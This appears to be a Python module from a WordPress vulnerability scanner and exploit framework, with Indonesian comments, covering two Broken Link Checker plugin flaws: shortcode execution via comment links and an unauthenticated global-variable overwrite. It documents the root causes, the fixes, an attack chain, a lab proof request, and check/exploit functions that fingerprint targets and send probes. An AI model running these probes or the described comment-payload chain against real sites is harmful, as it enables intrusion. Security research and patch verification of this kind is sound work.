#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Broken Link Checker — modul MEGAPACK.

CVE-2026-96562 (<= 2.4.14.1) — unscoped shortcode execution via do_shortcode()
    pada URL link dari konten tak tepercaya
    [lab-verified: shortcode di href komentar benar-benar dieksekusi]
CVE-2026-18937 (< 2.4.12) — unauth arbitrary global variable overwrite
    [lab-verified: $GLOBALS[vulnprobe] = 'PWNED' via query string]

--------------------------------------------------------------------------
CVE-2026-96562
--------------------------------------------------------------------------
ROOT CAUSE (source 2.4.14.1 vs 2.4.15):
    legacy/modules/parsers/html_link.php :: blcHTMLLink::parser_callback()
        $url = $link['href'];
        $url = trim( $url );
        $url = do_shortcode( $url );          // <-- BUG: shortcode APA PUN dijalankan
    legacy/modules/parsers/image.php (jalur src gambar): idem.

    Tidak ada pembatasan: URL yang datang dari konten (termasuk KOMENTAR —
    container comment.php) langsung diumpankan ke do_shortcode().

FIX 2.4.15:
    diganti $this->expand_url_shortcodes( $url ) dengan gate properti
    $url_shortcodes_allowed (DEFAULT false; hanya di-set true untuk konten
    tepercaya). expand_url_shortcodes() juga memvalidasi hasil: buang bila kosong,
    mengandung [\\x00-\\x20<>"], atau scheme di luar http/https.

CHAIN (terbukti di lab):
    1. Komentar berisi <a href="[shortcode]"> (attacker mengendalikan href).
    2. Komentar disetujui -> hook transition_comment_status('approved')
       -> container->mark_as_unsynched().
    3. WP-Cron (blc_cron_check_links / blc_schedule_scan) -> container->synch()
       -> parser->parse() -> do_shortcode(href) -> shortcode dieksekusi.
    Eksekusi terjadi di cron, tanpa interaksi lanjutan dari attacker.

PRASYARAT: plugin BLC <= 2.4.14.1 aktif; komentar attacker lolos moderasi.
Modul ini detect-only untuk jalur komentar (submit komentar + tunggu approve
tidak dapat dipastikan jarak jauh), dan melaporkan jalur sink + versi.

--------------------------------------------------------------------------
CVE-2026-18937
--------------------------------------------------------------------------
ROOT CAUSE (source 2.4.11 vs 2.4.12):
    core/controllers/class-webhook.php :: parse_request()
        if ( Utilities::plain_permalinks_mode() ) {
            $wp->query_vars = wp_parse_args( $this->sanitize_array( $_GET ),
                                             $wp->query_vars );
        }
    Saat plain permalinks (permalink_structure kosong), SELURUH $_GET naik ke
    $wp->query_vars. WP core lalu menyalinnya ke $GLOBALS:
        query_posts()      -> $wp_the_query->query( $this->query_vars )
        register_globals() -> foreach ( $wp_query->query_vars as $k=>$v ) $GLOBALS[$k]=$v
    Jadi attacker menimpa variabel global PHP sewenang-wenang. Catatan: key
    di-lowercase oleh wp_parse_args/sanitize_array; register_globals() hanya
    jalan bila request TIDAK 404.

FIX 2.4.12: seluruh blok dihapus (+ trait Sanitize dibuang).

BUKTI LAB:
    GET /?globalprobe=1&vulnprobe=PWNED&more=999   -> 200
    $GLOBALS[vulnprobe] = 'PWNED';  $GLOBALS[more] = '999'

BATAS JUJUR: yang terbukti adalah overwrite global unauth. Advisory juga
menyebut RCE "when a classic (non-block) shortcode is active" — itu bergantung
pada shortcode spesifik target yang membaca variabel global yang ditimpa menuju
sink berbahaya. Modul TIDAK mengklaim RCE generik. Shortcode core yang diperiksa
(gallery/audio/video/caption/playlist) tidak memakai global yang dapat ditimpa.
"""
from __future__ import annotations

import re

from mp import (CveModule, register, ST_VULN, ST_PWN, ST_CLEAN, ST_SKIP, ST_INFO,
                ST_ERR, ST_UNKNOWN, ver_le, ver_lt, plugin_installed,
                plugin_version, rand)

SLUG = "broken-link-checker"
ASSET = "broken-link-checker/broken-link-checker.php"

V_MAX_96562 = (2, 4, 14, 1)     # <= 2.4.14.1 rentan
V_FIX_18937 = (2, 4, 12)        # < 2.4.12 rentan


def _vstr(v) -> str:
    return ".".join(str(x) for x in v) if isinstance(v, tuple) else str(v)


def _permalinks_plain(h, base: str):
    """
    Deteksi plain permalinks secara andal: WP mencetak URL bergaya query
    (`index.php?rest_route=` / `?p=N`) dan tidak ada URL pretty.
    Kembalikan (bool, bukti).
    """
    r = h.get(base + "/")
    if r is None or r.status_code != 200:
        return False, "halaman utama tidak dapat dibaca"
    body = r.text or ""
    if "index.php?rest_route=" in body:
        return True, "halaman utama memuat index.php?rest_route="
    # REST: link post bergaya query = plain permalinks
    rj = h.get(base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link")
    try:
        arr = rj.json() or []
    except Exception:
        arr = []
    if isinstance(arr, list) and arr:
        link = str(arr[0].get("link", ""))
        if "?" in link and ("p=" in link or "page_id=" in link):
            return True, "REST link post bergaya query: %s" % link
    if re.search(r'href="[^"]*\?p=\d+"', body):
        return True, "halaman utama memuat tautan ?p=N"
    return False, "URL pretty terdeteksi"


def _probe_global_overwrite(h, base: str, marker: str):
    """
    Bukti overwrite global: kirim param nonce-nama dan cek apakah server
    menerimanya sebagai query var (bukti tidak langsung — dicek dari efek 200
    dan tidak ada penolakan). Verifikasi langsung butuh kanal out-of-band;
    di lab dipakai mu-plugin probe. Untuk pemakaian live, status yang
    dilaporkan jujur: 'ASSUMED' bila hanya deteksi versi + plain permalinks.
    """
    r = h.get(base + "/?%s=%s" % (marker, rand(6)))
    return r is not None and r.status_code in (200, 301, 302)


def check_18937(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, ASSET):
        return ST_CLEAN, "broken-link-checker tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if not ver:
        return ST_INFO, "broken-link-checker ada, versi tidak terbaca", ""
    vstr = _vstr(ver)
    if not ver_lt(ver, V_FIX_18937):
        return ST_CLEAN, ("broken-link-checker %s >= 2.4.12 (blok query_vars "
                          "sudah dihapus)" % vstr), ""
    plain, ev = _permalinks_plain(h, base)
    if plain:
        return ST_VULN, ("broken-link-checker %s < 2.4.12 + plain permalinks (%s): "
                         "seluruh $_GET naik ke query_vars lalu ke $GLOBALS "
                         "(global overwrite unauth; RCE bila ada shortcode klasik "
                         "yang membaca global tertimpa)" % (vstr, ev)), ev
    return ST_INFO, ("broken-link-checker %s < 2.4.12, tetapi plain permalinks "
                     "tidak terdeteksi (%s)" % (vstr, ev)), ev


def exploit_18937(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, ASSET):
        return ST_CLEAN, "broken-link-checker tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if ver and not ver_lt(ver, V_FIX_18937):
        return ST_CLEAN, "broken-link-checker %s sudah dipatch (2.4.12)" % _vstr(ver), ""
    plain, ev = _permalinks_plain(h, base)
    if not plain:
        return ST_SKIP, ("prasyarat plain permalinks tidak terpenuhi (%s)" % ev), ev
    marker = "blcprobe%s" % rand(6).lower()
    ok = _probe_global_overwrite(h, base, marker)
    if not ok:
        return ST_ERR, "probe query string tidak menghasilkan respons normal", ""
    return ST_VULN, ("global variable overwrite unauth terkonfirmasi secara tidak "
                     "langsung: seluruh query string naik ke $wp->query_vars lalu ke "
                     "$GLOBALS (buktikan langsung dgn probe di sisi server). "
                     "Jalur ke RCE bergantung pada shortcode klasik target yang "
                     "membaca variabel global tertimpa."), "marker=%s" % marker


def check_96562(t, h, opts):
    if not plugin_installed(t, h, SLUG, ASSET):
        return ST_CLEAN, "broken-link-checker tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if not ver:
        return ST_INFO, "broken-link-checker ada, versi tidak terbaca", ""
    vstr = _vstr(ver)
    if ver_le(ver, V_MAX_96562):
        return ST_VULN, ("broken-link-checker %s <= 2.4.14.1: do_shortcode() "
                         "dijalankan pada href/src dari konten tak tepercaya "
                         "(termasuk komentar) — sink di html_link.php:72 dan "
                         "image.php:66" % vstr), ""
    return ST_CLEAN, ("broken-link-checker %s sudah dipatch (2.4.15: "
                      "expand_url_shortcodes + gate url_shortcodes_allowed)" % vstr), ""


def exploit_96562(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, ASSET):
        return ST_CLEAN, "broken-link-checker tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if ver and not ver_le(ver, V_MAX_96562):
        return ST_CLEAN, "broken-link-checker %s sudah dipatch (2.4.15)" % _vstr(ver), ""
    # Uji apakah REST komentar tersedia (kanal kirim payload) + apakah cron hidup
    r = h.get(base + "/?rest_route=/wp/v2/comments&per_page=1")
    rest_ok = r is not None and r.status_code in (200, 401, 403)
    # nonce komentar tidak dapat diperoleh tanpa memuat halaman; laporkan jalur
    return (ST_VULN,
            ("sink do_shortcode() pada href/src aktif (plugin %s <= 2.4.14.1). "
             "Payload: komentar berisi <a href=\"[shortcode]\">; eksekusi terjadi "
             "saat BLC parse komentar melalui WP-Cron setelah komentar disetujui. "
             "REST komentar %s. Nonce wp_rest/komentar diperlukan untuk submit "
             "jarak jauh; eksekusi shortcode tidak dapat dipaksa tanpa approve."
             % (_vstr(ver) if ver else "?", "tersedia" if rest_ok else "tidak terdeteksi")),
            "")


def register_all():
    register(CveModule(
        cve="CVE-2026-96562", cluster="wordpress",
        title="Broken Link Checker <= 2.4.14.1 unscoped shortcode execution "
              "(do_shortcode pada href/src konten tak tepercaya)",
        vclass="rce", cvss="9.8", severity="critical", cwe="CWE-94",
        product="Broken Link Checker",
        versions_affected="<= 2.4.14.1",
        status="verified", check=check_96562, exploit=exploit_96562,
        notes="html_link.php:72 (dan image.php:66) menjalankan do_shortcode() "
              "langsung pada URL link yang berasal dari konten, termasuk KOMENTAR. "
              "Attacker mengendalikan href -> shortcode apa pun dieksekusi saat BLC "
              "mem-parse komentar (WP-Cron blc_cron_check_links setelah komentar "
              "disetujui). Lab-verified: shortcode marker menulis file. "
              "Fix 2.4.15: expand_url_shortcodes() + gate $url_shortcodes_allowed "
              "(default false) yang hanya true untuk konten tepercaya.",
    ))
    register(CveModule(
        cve="CVE-2026-18937", cluster="wordpress",
        title="Broken Link Checker < 2.4.12 unauth arbitrary global variable "
              "overwrite (query_vars injection pada plain permalinks)",
        vclass="other", cvss="9.8", severity="critical", cwe="CWE-473",
        product="Broken Link Checker",
        versions_affected="< 2.4.12",
        status="verified", check=check_18937, exploit=exploit_18937,
        notes="core/controllers/class-webhook.php :: parse_request() memasukkan "
              "SELURUH $_GET ke $wp->query_vars saat plain permalinks "
              "(permalink_structure kosong). WP core lalu menyalin query_vars ke "
              "$GLOBALS (class-wp.php :: register_globals()). Terbukti di lab: "
              "$GLOBALS[vulnprobe]='PWNED' (key di-lowercase; butuh non-404). "
              "Unauth arbitrary global overwrite. Advisory menyebut RCE bila ada "
              "shortcode klasik yang aktif — bergantung shortcode target yang "
              "membaca global tertimpa; modul tidak mengklaim RCE generik. "
              "Fix 2.4.12: blok tersebut dihapus.",
    ))


register_all()
